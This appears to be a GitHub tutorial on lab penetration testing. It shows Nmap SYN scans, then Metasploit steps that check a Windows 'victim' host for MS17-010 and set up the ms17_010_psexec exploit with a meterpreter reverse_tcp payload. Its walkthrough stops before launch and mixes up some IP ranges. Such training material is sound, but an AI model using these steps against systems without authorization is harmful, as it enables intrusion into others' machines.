# Network Penetration Testing using Metasploit Framework and Nmap
## Tools used: 

## Nmap :
Nmap (Network Mapper) is a popular open-source tool used for network exploration and security auditing. It can be used to scan a network to identify active hosts, services running on those hosts, and potential vulnerabilities.

Here are the basic steps for using Nmap for network scanning:

Install Nmap: Nmap is available for multiple platforms, including Windows, Linux, and macOS. You can download the latest version from the official Nmap website.

Identify the target network: Determine the IP address range or hostname of the network you want to scan. For example, if you want to scan all the hosts in the 172.16.73.0/24 network, the target IP range would be 172.16.73.1-255.

Run the scan: Open a command prompt or terminal and run the Nmap scan command. Here is an example:
nmap -sS 172.16.73.1-255
This command will perform a TCP SYN scan on all hosts in the 192.168.0.0/24 network.

Analyze the results: Nmap will display the results of the scan on the command line. The output will show the IP addresses of the hosts that responded to the scan and the open ports and services running on those hosts.

## Metasploit Project- Metasploit Framework :
There is a high-level project known as the Metasploit project. The Metasploit framework is a sub project that we commonly known as Metasploit. It is a open source software that is written in Ruby programming language. The Metasploit Framework is designed to be modular so that new functionality can be added easily. Developers of Metasploit are open to code submission. In 2009, a information security company Rapid7, acquired Metasploit project. There are several commercial products from the Metasploit framework such as Metasploit Pro, Metasploit Express, and Metasploit Community Editions.

# Network Scanning using Metasploit :
Now that we have seen all the basic commands, let’s use Metasploit to perform Network Scanning.
Scenario — Network port scan with portscan/tcp
Victim’s IP: 172.16.73.9 (Windows)
Port range: 1–1024
Attacker’s machine: Kali Linux
### Step 1: Open Terminal in Kali and type msfconsole to open Metasploit framework console.
### Step 2: Search for required module i.e. Scanner module using  grep scanner search smb command.
![image](https://github.com/NitinSharma973/Network-penetration/assets/89895011/924977f8-c946-4a68-8bf1-825566ea3dfe)

 
### Step 3: Now we will select the required module i.e.auxiliary/scanner/smb/smb_ms17_010) using  use auxiliary/scanner/smb/smb_ms17_010 command.
### Step 4: Type info command for getting information about the selected module and to see the related options.
 ![image](https://github.com/NitinSharma973/Network-penetration/assets/89895011/cf23da6c-537b-4107-b9bf-4564114051b7)

### Step 5: Now we will specify the target IP address and the port range by typing following commands: 
Ø set RHOSTS 172.16.73.9
### Step 6: Finally, to initiate the scan against the target system, type run command.
 ![image](https://github.com/NitinSharma973/Network-penetration/assets/89895011/123d36d7-37df-43c6-a794-9c3ac22edd6f)

### Step 7: Search for required  Exploits i.e. exploit  module using  grep exploit search smb command.
 ![image](https://github.com/NitinSharma973/Network-penetration/assets/89895011/c5e6f842-3668-4882-aee3-172ec566a04a)

### Step 8: Now we will select the required exploit   i.e. exploit/windows/smb/ms17_010_psexec using  
use exploit/windows/smb/ms17_010_psexec 010 command.
### Step 9: Type info command for getting information about the selected exploit  and to see the related options.
 ![image](https://github.com/NitinSharma973/Network-penetration/assets/89895011/5dec400c-6dbb-4f29-a45e-a25f61ebce2e)

### Step 10: Now we will select the required  payloads i.e. payload windows/meterpreter/reverse_tcp using  Set  payload windows/meterpreter/reverse_tcp command. 
 ![image](https://github.com/NitinSharma973/Network-penetration/assets/89895011/12651a5a-5354-4f11-864a-3a4eef62d8c9)


We can see that as the scan runs, we receive output of network ports that are discovered to be open. This is how we can use Metasploit for network scanning. Metasploit can also be used for discovering vulnerabilities and exploiting them.
